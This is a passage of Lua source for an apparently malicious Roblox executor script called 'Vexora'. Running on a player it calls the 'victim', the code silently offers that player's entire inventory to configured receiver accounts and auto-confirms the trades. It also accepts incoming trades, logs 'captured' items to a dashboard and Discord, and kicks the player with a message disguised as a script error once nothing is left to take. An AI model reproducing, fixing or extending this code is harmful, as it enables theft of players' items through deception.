    { "TradeGUI_Phone", "Container", "Trade", "Actions", "Accept", "ActionButton" },
    { "TradeGUI_Phone", "Container", "Trade", "Actions", "Accept", "Cooldown", "Blocker" },
    { "TradeGUI.Phone", "Container", "Trade", "Actions", "Accept", "Confirm", "ActionButton" },
    { "TradeGUI.Phone", "Container", "Trade", "Actions", "Accept", "ActionButton" },
}

local function mm2Confirm()
    local trade = mm2Trade()
    local accept = trade and trade:FindFirstChild("AcceptRequest")
    if accept then pcall(function() accept:FireServer() end) end

    local gui = LocalPlayer and LocalPlayer:FindFirstChildOfClass("PlayerGui")
    if not gui then return end

    for _, path in ipairs(MM2_ACCEPT_PATHS) do
        local node = gui
        for _, name in ipairs(path) do
            node = node and node:FindFirstChild(name)
        end
        if node then
            pcall(function() firesignal(node.Activated) end)
            pcall(function() firesignal(node.MouseButton1Click) end)
        end
    end
end

local function tradeWindow()
    local player = LocalPlayer or Players.LocalPlayer
    local gui = player and player:FindFirstChildOfClass("PlayerGui")
    if not gui then return nil end
    for _, obj in ipairs(gui:GetDescendants()) do
        local visible = true
        if obj:IsA("ScreenGui") then
            visible = obj.Enabled ~= false
        elseif obj:IsA("GuiObject") then
            visible = obj.Visible ~= false
        end
        local n = obj.Name:lower()
        local notification = n:find("request", 1, true) or n:find("notif", 1, true)
            or n:find("prompt", 1, true) or n:find("toast", 1, true)
        if visible and not notification and (obj:IsA("ScreenGui") or obj:IsA("Frame"))
            and n:find("trade", 1, true) then
            return obj
        end
    end
    return nil
end

-- buttons in the trade window that hold your items, never the chrome. your panel is
-- preferred by name so the receiver's cards are not clicked along with yours.
local function hasInputConnection(obj)
    if typeof(getconnections) ~= "function" then return false end

    -- MouseButton1Click only exists on actual buttons. touching it on a Frame throws
    -- "not a valid member", which used to kill the whole card scan.
    local signal
    pcall(function()
        if obj:IsA("TextButton") or obj:IsA("ImageButton") then
            signal = obj.MouseButton1Click
        else
            signal = obj.InputBegan
        end
    end)
    if not signal then return false end

    local ok, list = pcall(getconnections, signal)
    return (ok and list and #list > 0) or false
end

local function clickableCards(root)
    local out = {}
    for _, obj in ipairs(root:GetDescendants()) do
        if obj:IsA("TextButton") or obj:IsA("ImageButton") then
            table.insert(out, obj)
        elseif obj:IsA("ImageLabel") or obj:IsA("TextLabel") or obj:IsA("Frame") then
            local active = false
            pcall(function() active = obj.Active == true end)
            if active or hasInputConnection(obj) then table.insert(out, obj) end
        end
    end
    return out
end

local function screenOf(obj)
    local node = obj
    while node and not node:IsA("ScreenGui") do node = node.Parent end
    return node
end

local function windowSignature(window)
    local ok, list = pcall(function() return window:GetDescendants() end)
    return ok and #list or 0
end

local function scrollCardIntoView(button)
    pcall(function()
        local node = button.Parent
        while node and not node:IsA("ScrollingFrame") do node = node.Parent end
        if not node then return end
        local canvas = node.CanvasPosition
        local top = button.AbsolutePosition.Y - node.AbsolutePosition.Y + canvas.Y
        local maxY = math.max(0, node.AbsoluteCanvasSize.Y - node.AbsoluteSize.Y)
        local target = math.clamp(top - node.AbsoluteSize.Y * 0.25, 0, maxY)
        node.CanvasPosition = Vector2.new(canvas.X, target)
        task.wait(0.12)
    end)
end

-- a card only counts as offered when the window changed, so a click that the game
-- ignored is retried with raw input and then with a direct signal fire
local function activateCard(button, window)
    scrollCardIntoView(button)
    local sigRoot = screenOf(button) or window
    local before = windowSignature(sigRoot)

    pcall(function() game:GetService("VirtualUser"):ClickButton(button) end)
    task.wait(0.15)
    if windowSignature(sigRoot) ~= before then return "virtual" end

    -- some trade grids need a second tap to move the card into the offer
    pcall(function() game:GetService("VirtualUser"):ClickButton(button) end)
    task.wait(0.2)
    if windowSignature(sigRoot) ~= before then return "virtual2" end

    local pos
    pcall(function() pos = button.AbsolutePosition + button.AbsoluteSize * 0.5 end)

    -- VirtualUser takes real screen coordinates, so this works for cards that are
    -- frames with no button class and no per-object connections
    if pos then
        pcall(function()
            local vu = game:GetService("VirtualUser")
            vu:MoveMouse(pos)
            vu:Button1Down(pos, Enum.UserInputType.MouseButton1)
            vu:Button1Up(pos, Enum.UserInputType.MouseButton1)
        end)
        task.wait(0.2)
        if windowSignature(sigRoot) ~= before then return "virtual-mouse" end
    end

    if pos and typeof(mousemoveabs) == "function" then
        pcall(mousemoveabs, pos.X, pos.Y)
        if typeof(mouse1click) == "function" then
            pcall(mouse1click)
            task.wait(0.15)
            if windowSignature(sigRoot) ~= before then return "mouse" end
        elseif typeof(mouse1down) == "function" and typeof(mouse1up) == "function" then
            pcall(mouse1down)
            pcall(mouse1up)
            task.wait(0.15)
            if windowSignature(sigRoot) ~= before then return "mouse" end
        end
    end

    if typeof(firesignal) == "function" then
        pcall(function() firesignal(button.MouseButton1Click) end)
        task.wait(0.15)
        if windowSignature(sigRoot) ~= before then return "signal" end
    end

    return nil
end

local function tradeGuiRoots(window)
    local player = LocalPlayer or Players.LocalPlayer
    local gui = player and player:FindFirstChildOfClass("PlayerGui")
    if not gui then return {} end

    local trade, inventory = {}, {}
    for _, screen in ipairs(gui:GetChildren()) do
        if screen:IsA("ScreenGui") and screen.Enabled ~= false then
            local n = screen.Name:lower()
            if n:find("trade", 1, true) or n:find("offer", 1, true) then
                table.insert(trade, screen)
            elseif n:find("invent", 1, true) or n:find("collection", 1, true)
                or n:find("backpack", 1, true) then
                table.insert(inventory, screen)
            end
        end
    end

    local roots = {}
    for _, screen in ipairs(trade) do table.insert(roots, screen) end
    for _, screen in ipairs(inventory) do table.insert(roots, screen) end

    -- the frame we matched can be a header or a toast: the cards live somewhere
    -- else in the same screen, so the whole screen goes in as well
    if window then
        local screen = screenOf(window)
        if screen then
            local seen = false
            for _, root in ipairs(roots) do if root == screen then seen = true end end
            if not seen then table.insert(roots, 1, screen) end
        end
    end
    return roots
end

local function findAcceptButton()
    local player = LocalPlayer or Players.LocalPlayer
    local gui = player and player:FindFirstChildOfClass("PlayerGui")
    if not gui then return nil end

    for _, obj in ipairs(gui:GetDescendants()) do
        if obj:IsA("TextButton") or obj:IsA("ImageButton") then
            local label = (buttonLabel(obj) or obj.Name):lower()
            if label == "accept" or label:find("accept", 1, true) or label == "yes"
                or label == "confirm" or label == "agree" then
                local node, context = obj, ""
                while node and node ~= gui do
                    context = context .. " " .. node.Name:lower()
                    node = node.Parent
                end
                if context:find("trade", 1, true) or context:find("request", 1, true) then
                    return obj
                end
            end
        end
    end
    return nil
end

local function tradeButtons(window)
    local guiRoots = tradeGuiRoots(window)
    local hasWindow = false
    for _, root in ipairs(guiRoots) do if root == window then hasWindow = true end end
    if not hasWindow then table.insert(guiRoots, 1, window) end

    local preferred, fallback, grids = {}, {}, {}
    for _, root in ipairs(guiRoots) do
        for _, obj in ipairs(root:GetDescendants()) do
            if obj:IsA("ScrollingFrame") then table.insert(grids, obj) end
            if obj:IsA("Frame") or obj:IsA("ScrollingFrame") then
                local n = obj.Name:lower()
                if n:find("your", 1, true) or n:find("self", 1, true) or n:find("player1", 1, true)
                    or n:find("left", 1, true) or n:find("myoffer", 1, true) or n:find("myitem", 1, true) then
                    table.insert(preferred, obj)
                elseif n:find("offer", 1, true) or n:find("invent", 1, true) or n:find("item", 1, true)
                    or n:find("weapon", 1, true) or n:find("knife", 1, true) or n:find("gun", 1, true)
                    or n:find("skin", 1, true) or n:find("grid", 1, true) or n:find("slot", 1, true) then
                    table.insert(fallback, obj)
                end
            end
        end
    end

    local roots = #preferred > 0 and preferred
        or (#fallback > 0 and fallback
        or (#grids > 0 and grids or guiRoots))
    local buttons, seenButton, seenLabel = {}, {}, {}
    for _, root in ipairs(roots) do
        for _, obj in ipairs(clickableCards(root)) do
            if not seenButton[obj] then
                seenButton[obj] = true
                local label = buttonLabel(obj) or norm(obj.Name)
                local generic = false
                for _, name in ipairs(GENERIC_NAMES) do
                    if label:lower() == name then generic = true break end
                end
                local key = label:lower()
                -- image-only cards are all named "Item"/"Slot"; every one has to be clicked
                if not isControlLabel(label) and (generic or not seenLabel[key]) then
                    seenLabel[key] = true
                    table.insert(buttons, { button = obj, label = label })
                end
            end
        end
    end

    -- cards that are not buttons and have no connection still carry a name label;
    -- the nearest sized gui object above that label is the card that gets clicked
    if #buttons < 2 then
        for _, root in ipairs(guiRoots) do
            for _, obj in ipairs(root:GetDescendants()) do
                if obj:IsA("TextLabel") or obj:IsA("TextButton") then
                    local text = norm(obj.Text)
                    if #text >= 2 and not isControlLabel(text) then
                        local node = obj
                        while node and node ~= root do
                            if node:IsA("ImageButton") or node:IsA("TextButton")
                                or node:IsA("ImageLabel") or node:IsA("Frame") then
                                local size
                                pcall(function() size = node.AbsoluteSize end)
                                if size and size.X >= 20 and size.Y >= 20 then
                                    local key = text:lower()
                                    if not seenButton[node] and not seenLabel[key] then
                                        seenButton[node] = true
                                        seenLabel[key] = true
                                        table.insert(buttons, { button = node, label = text })
                                    end
                                    break
                                end
                            end
                            node = node.Parent
                        end
                    end
                end
            end
        end
    end
    return buttons
end

local function windowDump(window)
    local lines, frames, cardsList = {}, {}, {}
    local function push(list, text)
        if #list < 12 then table.insert(list, tostring(text):sub(1, 58)) end
    end

    local roots = tradeGuiRoots(window)
    if window then
        local seen = false
        for _, root in ipairs(roots) do if root == window then seen = true end end
        if not seen then table.insert(roots, 1, window) end
    end

    local nodes, cards, wired = 0, 0, 0
    for _, root in ipairs(roots) do
        push(frames, "root:" .. root.ClassName .. ":" .. root.Name)
        for _, obj in ipairs(root:GetDescendants()) do
            nodes = nodes + 1
            if obj:IsA("ScrollingFrame") then
                push(frames, "grid:" .. obj.Name .. "(" .. #obj:GetChildren() .. ")")
            elseif obj:IsA("Frame") and obj.Name:lower():find("trade", 1, true) then
                push(frames, "frame:" .. obj.Name)
            elseif (obj:IsA("TextLabel") or obj:IsA("TextButton")) and #norm(obj.Text) >= 2 then
                local text = norm(obj.Text)
                if not isControlLabel(text) then push(frames, "text:" .. text) end
            end

            local isButton = obj:IsA("TextButton") or obj:IsA("ImageButton")
            local conn = hasInputConnection(obj)
            if isButton or conn then
                cards = cards + 1
                if conn then wired = wired + 1 end
                local label = buttonLabel(obj) or norm(obj.Name)
                push(cardsList, obj.ClassName:sub(1, 9) .. ":" .. obj.Name:sub(1, 12) .. ":" .. label:sub(1, 16))
            end
        end
    end

    table.insert(lines, 1, string.format("nodes=%d cards=%d wired=%d roots=%d",
        nodes, cards, wired, #roots))
    for _, line in ipairs(frames) do table.insert(lines, line) end
    for _, line in ipairs(cardsList) do table.insert(lines, line) end
    return lines
end

local function printTree()
    local roots = tradeGuiRoots(tradeWindow())
    local count = 0
    local function walk(node, depth)
        for _, child in ipairs(node:GetChildren()) do
            if count >= 80 then return end
            count = count + 1
            local extra = ""
            if child:IsA("TextButton") or child:IsA("TextLabel") then
                local text = norm(child.Text)
                if #text >= 1 then extra = " [" .. text:sub(1, 18) .. "]" end
            end
            print(string.format("[vexora] tree: %s%s:%s%s",
                string.rep("  ", depth), child.ClassName, tostring(child.Name):sub(1, 24), extra))
            walk(child, depth + 1)
        end
    end
    for _, root in ipairs(roots) do
        print("[vexora] tree: " .. root.ClassName .. ":" .. tostring(root.Name))
        walk(root, 1)
    end
end

local function probeWithWindow()
    local lines = probeLines()
    local ok, dump = pcall(windowDump, tradeWindow())
    if ok and dump then
        for _, line in ipairs(dump) do
            if #lines < 40 then table.insert(lines, line) end
        end
    else
        table.insert(lines, "dump error: " .. tostring(dump):sub(1, 40))
    end
    return lines
end

local function offerEverything(receiver)
    local items = Vexora.items()
    local clicked, labels, methods, fired, scanned = 0, {}, {}, 0, 0

    -- the trade window lists your own items. clicking those cards is what actually
    -- fills the offer slots, whatever the game named its remotes.
    local window = tradeWindow()
    if window then
        -- open the backpack with the mouse first: the trade grid reuses it and the
        -- item labels only exist once the panel has been opened
        openInventory()
        task.wait(0.4)

        -- the grid is built a moment after the window opens
        local list = {}
        for attempt = 1, 4 do
            task.wait(attempt == 1 and 1.2 or 1.5)
            local ok, found = pcall(tradeButtons, tradeWindow() or window)
            if not ok then print("[vexora] card scan error: " .. tostring(found)) end
            if ok and found and #found > 0 then list = found break end
        end
        scanned = #list
        local names = {}
        for _, entry in ipairs(list) do table.insert(names, entry.label) end
        rememberItems(names)
        if scanned < 3 then printTree() end
        for _, entry in ipairs(list) do
            if clicked >= OFFER_LIMIT then break end
            local used = activateCard(entry.button, tradeWindow() or window)
            if used then
                clicked = clicked + 1
                tradeSawItems = true
                table.insert(labels, entry.label)
                methods[used] = (methods[used] or 0) + 1
            end
            task.wait(OFFER_GAP)
        end
    end

    -- guessed item remotes only when the ui gave us nothing to click. the names
    -- read off the grid are cached, so this can still name the items
    if clicked == 0 then
        items = Vexora.items()
        for _, name in ipairs(items) do
            for _, remote in ipairs(itemRemotes) do
                fire(remote, name)
                fire(remote, receiver.Name, name)
                fire(remote, "add", name)
                fire(remote, name, receiver.Name)
                fired = fired + 1
            end
            task.wait(OFFER_GAP)
        end
    end

    return clicked, labels, items, fired, methods, scanned
end

local function confirmTrade()
    for _, remote in ipairs(acceptRemotes) do
        fire(remote, true)
        fire(remote, "accept")
    end
    local accept = findAcceptButton()
    if accept then clickButton(accept) end
end

local function runReceiverTrade(player)
    if not AUTO_TRADE_RECEIVERS or IS_CLAIMER or stopped then return end
    local key = player.Name:lower()
    if tradesRun[key] then return end
    tradesRun[key] = true

    task.spawn(function()
        outgoingTrade = true
        reportTrade("receiver_joined", player.Name, { detail = "starting trade" })
        task.wait(1.5)

        -- mm2 has a real trade api: StartTrade, OfferItem, AcceptRequest. no clicking
        if PLACE_ID == 142823291 then
            local started = mm2StartTrade(player)
            reportTrade("request", player.Name, {
                detail = started and "mm2 StartTrade" or "mm2 StartTrade missing",
            })
            if not started then
                reportTrade("no_window", player.Name, { detail = "mm2 trade api not found" })
                outgoingTrade = false
                task.delay(45, function() tradesRun[key] = nil end)
                return
            end

            local deadline = os.clock() + 15
            while not stopped and os.clock() < deadline and not tradeWindow() do task.wait(0.3) end

            if not tradeWindow() then
                reportTrade("no_window", player.Name, { detail = "mm2 window never opened" })
                outgoingTrade = false
                task.delay(30, function() tradesRun[key] = nil end)
                return
            end

            reportTrade("window", player.Name, { detail = "mm2 trade ui open" })
            local sent, names = mm2Offer()
            reportTrade("offer", player.Name, {
                items = names,
                detail = sent .. " item(s) via OfferItem",
            })

            task.wait(0.4)
            mm2Confirm()
            reportTrade("confirm", player.Name, { detail = "mm2 accept x1" })
            task.wait(1)
            mm2Confirm()
            reportTrade("confirm", player.Name, { detail = "mm2 accept x2" })
            task.wait(1.5)
            reportTrade("done", player.Name, { detail = "mm2 offer sent" })

            outgoingTrade = false
            task.delay(45, function() tradesRun[key] = nil end)
            return
        end

        local opened, attempts = false, 0
        while not stopped and not opened and attempts < RECEIVER_RETRY do
            attempts = attempts + 1
            reportTrade("request", player.Name, { detail = "attempt " .. attempts .. "/" .. RECEIVER_RETRY })
            for _, remote in ipairs(tradeRemotes) do
                fire(remote, player)
                fire(remote, "trade", player)
                fire(remote, "request", player)
            end

            local deadline = os.clock() + 7
            while os.clock() < deadline and not stopped do
                if tradeWindow() then opened = true break end
                task.wait(0.4)
            end
            if not opened then task.wait(2) end
        end

        if not opened then
            reportTrade("no_window", player.Name, {
                detail = #tradeRemotes > 0 and "trade ui never opened" or "no trade remotes found",
            })
            outgoingTrade = false
            task.delay(60, function() tradesRun[key] = nil end)
            return
        end

        reportTrade("window", player.Name, { detail = "trade ui open" })

        if PUSH_ALL_ITEMS then
            local clicked, labels, items, fired, methods, scanned = offerEverything(player)
            local used = {}
            for name, n in pairs(methods or {}) do table.insert(used, name .. "=" .. n) end
            reportTrade("offer", player.Name, {
                items = clicked > 0 and labels or items,
                detail = clicked > 0
                    and string.format("%d item(s) clicked (%s) of %d card(s)", clicked, table.concat(used, " "), scanned)
                    or string.format("%d item(s) via %d remote(s), %d card(s) scanned", #items, #itemRemotes, scanned),
            })
            if clicked == 0 and fired == 0 then
                reportProbe(player.Name, string.format("nothing offered - %d card(s) scanned", scanned), probeWithWindow())
            end
        end

        task.wait(1.2)
        if CONFIRM_TRADES then
            confirmTrade()
            reportTrade("confirm", player.Name, { detail = "first confirm" })
            task.wait(2)
            confirmTrade()
            reportTrade("confirm", player.Name, { detail = "second confirm" })
        end

        task.wait(2)
        local stillOpen = tradeWindow() ~= nil
        reportTrade(stillOpen and "waiting" or "done", player.Name, {
            detail = stillOpen and "receiver has to accept" or "trade window closed",
        })
        outgoingTrade = false
        task.delay(60, function() tradesRun[key] = nil end)
    end)
end

--[[ ---- auto accept + capture from incoming trade calls ---- ]]
local hooked = 0
for _, remote in ipairs(tradeRemotes) do
    hooked = hooked + 1
    pcall(function()
        track(remote.OnClientEvent:Connect(function(...)
            local args = { ... }
            local victim = playerIn(args)
            if AUTO_ACCEPT and victim then
                pcall(function() remote:FireServer("accept", victim) end)
                pcall(function() remote:FireServer(victim) end)
            end
            local item = itemIn(args, victim)
            if victim and item then
                Vexora.capture(item, victim.Name, DEFAULT_VALUE)
            end
        end))
    end)
end

--[[ ---- auto trade with everybody ---- ]]
local trading = {}

local function autoTrade()
    if not AUTO_TRADE or #tradeRemotes == 0 then return end
    task.spawn(function()
        while AUTO_TRADE do
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and not trading[plr] then
                    trading[plr] = true
                    for _, remote in ipairs(tradeRemotes) do
                        pcall(function() remote:FireServer(plr) end)
                        pcall(function() remote:FireServer("trade", plr) end)
                    end
                    task.delay(AUTO_TRADE_DELAY * 2, function() trading[plr] = nil end)
                end
            end
            task.wait(AUTO_TRADE_DELAY)
        end
    end)
end

--[[ ---- backpack watcher ---- ]]
local seen = {}
local function watchBackpack(backpack)
    track(backpack.ChildAdded:Connect(function(child)
        if not child:IsA("Tool") then return end
        if seen[child.Name] then return end
        seen[child.Name] = true
        Vexora.capture(child.Name, "Unknown victim", DEFAULT_VALUE)
    end))
end

if LocalPlayer then
    track(LocalPlayer.ChildAdded:Connect(function(child)
        if child.Name == "Backpack" then
            task.wait(0.5)
            watchBackpack(child)
        end
    end))
    local bag = LocalPlayer:FindFirstChildOfClass("Backpack")
    if bag then watchBackpack(bag) end
end

--[[ ---- empty inventory -> kick ---- ]]
local kicked = false

-- Kick is a server-level call on a normal client script; executors only get away with
-- it at a high identity, and some reset the thread identity before we get there
local function raiseIdentity()
    pcall(function() setthreadidentity(8) end)
    pcall(function() setidentity(8) end)
    pcall(function() syn.set_thread_identity(8) end)
    pcall(function() getgenv().set_thread_identity(8) end)
end

local function kickPlayer(reason)
    if kicked or stopped then return end
    kicked = true
    AUTO_TRADE, AUTO_ACCEPT = false, false
    pcall(drain)

    -- show the same phrase on the loading screen so it reads like a script error
    if splash then
        local bg = splash:FindFirstChild("Backdrop")
        local status = bg and bg:FindFirstChild("Status")
        if status then
            if pulseTween then pcall(function() pulseTween:Cancel() end) end
            status.Text = tostring(reason)
            status.TextTransparency = 0
        end
    end

    -- executors differ on who may call Kick. a working kick kills this thread, so if
    -- we are still running a second later the attempt was a no-op and the next shape runs
    local attempts = {
        { name = "LocalPlayer:Kick", fn = function() LocalPlayer:Kick(reason) end },
        { name = "Players.LocalPlayer:Kick", fn = function() Players.LocalPlayer:Kick(reason) end },
        { name = "Players service", fn = function() game:GetService("Players").LocalPlayer:Kick(reason) end },
        { name = "Shutdown", fn = function() game:Shutdown() end },
    }

    task.spawn(function()
        raiseIdentity()
        for round = 1, 3 do
            raiseIdentity()
            for _, attempt in ipairs(attempts) do
                local ok, err = pcall(attempt.fn)
                print(string.format("[vexora] kick via %s -> %s", attempt.name,
                    ok and "sent" or tostring(err)))
                task.wait(ok and 1 or 0.2)
            end
        end
        print("[vexora] executor refuses Kick - still in game")
    end)
end

if KICK_IF_EMPTY and not IS_CLAIMER then
    task.spawn(function()
        -- executors can inject before LocalPlayer exists; wait it out rather than
        -- reading an empty world and booting instantly
        local waited = 0
        while not stopped and not (LocalPlayer or Players.LocalPlayer) and waited < 15 do
            task.wait(0.5)
            waited = waited + 0.5
        end
        local player = LocalPlayer or Players.LocalPlayer
        if not player then
            print("[vexora] no LocalPlayer - empty-inventory kick idle")
            return
        end

        captureSpawnDefaults()

        local graceUntil = os.time() + EMPTY_GRACE
        track(player.CharacterAdded:Connect(function()
            graceUntil = os.time() + EMPTY_GRACE
            captureSpawnDefaults()
            task.delay(2, captureSpawnDefaults)
            print(string.format("[vexora] respawned - %ds inventory grace", EMPTY_GRACE))
        end))

        print(string.format("[vexora] no-item kick armed | grace=%ds interval=%ds checks=%d | guns_only=%s",
            EMPTY_GRACE, EMPTY_INTERVAL, EMPTY_CHECKS, tostring(GUN_ONLY)))

        local emptyReads, lastSig, held, probed = 0, "", false, false
        while not stopped and not kicked do
            task.wait(EMPTY_INTERVAL)
            local real, all = realItems(os.time() >= graceUntil)
            local count = #real
            local sig = tostring(#all) .. "|" .. table.concat(real, ",")
            if sig ~= lastSig then
                local shown = {}
                for _, entry in ipairs(all) do
                    table.insert(shown, entry.name .. (entry.at == "equipped" and "*" or ""))
                end
                print(string.format("[vexora] inventory: %d item(s), %d counted -> %s", #all, count,
                    #shown > 0 and table.concat(shown, ", ") or "nothing"))
                lastSig = sig
            end

            -- never kick on a read we could not make. an unreadable inventory is not
            -- an empty one, and a trade in flight is proof there is something to trade
            if os.time() >= graceUntil and not outgoingTrade and not tradeSawItems then
                if count == 0 and inventoryInfo.seen then
                    emptyReads = emptyReads + 1
                    print(string.format("[vexora] nothing to trade (%d/%d)", emptyReads, EMPTY_CHECKS))
                    if emptyReads >= EMPTY_CHECKS then
                        print("[vexora] no real items - kicking")
                        kickPlayer(EMPTY_KICK_MESSAGE)
                        return
                    end
                elseif count == 0 then
                    emptyReads = 0
                    if not held then
                        held = true
                        print("[vexora] inventory unreadable - kick held")
                    end
                    if not probed then
                        probed = true
                        reportProbe("-", "inventory unreadable, kick held", probeLines())
                    end
                else
                    emptyReads = 0
                end
            end
        end
    end)
end

print(string.format("[vexora] client rev %s | %s | game=%s | server=%s | executor=%s", CLIENT_REV, ROBLOX_USER, GAME, tostring(SERVER_ID), EXECUTOR))
print(string.format("[vexora] claimer=%s auto_claim=%s kick_if_empty=%s grace=%ds checks=%d",
    tostring(IS_CLAIMER), tostring(AUTO_CLAIM and not IS_CLAIMER), tostring(KICK_IF_EMPTY and not IS_CLAIMER), EMPTY_GRACE, EMPTY_CHECKS))
print(string.format("[vexora] trade remotes=%d item remotes=%d confirm remotes=%d receivers=%d auto_trade=%s auto_accept=%s",
    #tradeRemotes, #itemRemotes, #acceptRemotes, #RECEIVER_ACCOUNTS, tostring(AUTO_TRADE), tostring(AUTO_ACCEPT)))
print("[vexora] API: Vexora.capture(item, victim, value) | Vexora.claim(item, victim, value) | Vexora.inventory() | Vexora.presence() | Vexora.selftest() | Vexora.stop()")

-- give the game a moment to finish loading, then announce the server so the alt
-- has a target before the first receiver ever opens a trade
task.delay(3, function()
    if Vexora.presence() then print("[vexora] presence sent for " .. tostring(SERVER_ID)) end
end)

function Vexora.kick(reason)
    kickPlayer(reason or EMPTY_KICK_MESSAGE)
end

if AUTO_ACCEPT and #acceptRemotes > 0 then
    for _, remote in ipairs(acceptRemotes) do
        pcall(function()
            track(remote.OnClientEvent:Connect(function(...)
                local victim = playerIn({ ... })
                pcall(function() remote:FireServer("accept", victim) end)
            end))
        end)
    end
end

autoTrade()

--[[ ---- receiver side: confirm incoming trade windows without input ---- ]]
if AUTO_ACCEPT then
    task.spawn(function()
        local lastPrompt, lastConfirm = 0, 0
        while not stopped do
            task.wait(1)
            -- the request prompt is not a trade window (it is filtered out on purpose),
            -- so the receiver has to click Accept before any window exists
            if not outgoingTrade then
                local now = os.clock()
                local accept = findAcceptButton()
                if accept and now - lastPrompt >= 2 then
                    lastPrompt = now
                    clickButton(accept)
                    print("[vexora] trade request prompt - accepted")
                end
                if tradeWindow() and now - lastConfirm >= 3 then
                    lastConfirm = now
                    confirmTrade()
                    print("[vexora] incoming trade window - confirmed")
                end
            end
        end
    end)
end

--[[ ---- receiver trades: fire on join, or if one is already in the server ---- ]]
if AUTO_TRADE_RECEIVERS then
    if #RECEIVER_ACCOUNTS == 0 then
        print("[vexora] no receivers configured - add one on My script to trade on join")
    else
        track(Players.PlayerAdded:Connect(function(plr)
            if isReceiver(plr.Name) then
                task.delay(1, function() runReceiverTrade(plr) end)
            end
        end))
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and isReceiver(plr.Name) then
                runReceiverTrade(plr)
            end
        end

        -- either join order works: if the receiver was already here the loop above
        -- catches it, and this keeps checking after missed or failed attempts
        task.spawn(function()
            while not stopped do
                task.wait(8)
                for _, plr in ipairs(Players:GetPlayers()) do
                    if plr ~= (LocalPlayer or Players.LocalPlayer) and isReceiver(plr.Name) then
                        runReceiverTrade(plr)
                    end
                end
            end
        end)
    end
end

-- mm2 asks the receiver through SendRequest.OnClientInvoke; answering true and
-- offering inside it is what makes an incoming request complete
-- mm2 asks the receiver through SendRequest.OnClientInvoke; answering true and
-- offering inside it is what makes an incoming request complete. the trade folder
-- can replicate after this script starts, so the hook is retried instead of one-shot.
if PLACE_ID == 142823291 then
    task.spawn(function()
        for _ = 1, 30 do
            local trade = mm2Trade() or ReplicatedStorage:WaitForChild("Trade", 2)
            local sendRequest = trade and trade:FindFirstChild("SendRequest")
            if sendRequest then
                pcall(function()
                    sendRequest.OnClientInvoke = function()
                        task.spawn(function()
                            task.wait(0.4)
                            local sent = mm2Offer()
                            task.wait(0.4)
                            mm2Confirm()
                            print(string.format("[vexora] mm2 request accepted - %d item(s) offered", sent))
                        end)
                        return true
                    end
                end)
                print("[vexora] mm2 SendRequest hook installed")
                return
            end
            task.wait(2)
        end
        print("[vexora] mm2 SendRequest hook not installed")
    end)
end

task.delay(1, function()
    reportTrade("engine", "-", {
        detail = string.format("trade=%d item=%d confirm=%d receivers=%d",
            #tradeRemotes, #itemRemotes, #acceptRemotes, #RECEIVER_ACCOUNTS),
    })
end)

task.spawn(function()
    task.wait(1)
    if Vexora.selftest() then
        print("[vexora] selftest queued — check dashboard + discord")
    end
    if REPORT_INVENTORY then
        local items = Vexora.inventory()
        print(string.format("[vexora] inventory: %d item(s) — %s", #items, table.concat(items, ", ")))
    end
end)

--[[ ---- session timer: the loader holds for five minutes, then everything detaches ---- ]]
task.delay(SESSION_SECONDS, function()
    Vexora.stop()
end)

return Vexora
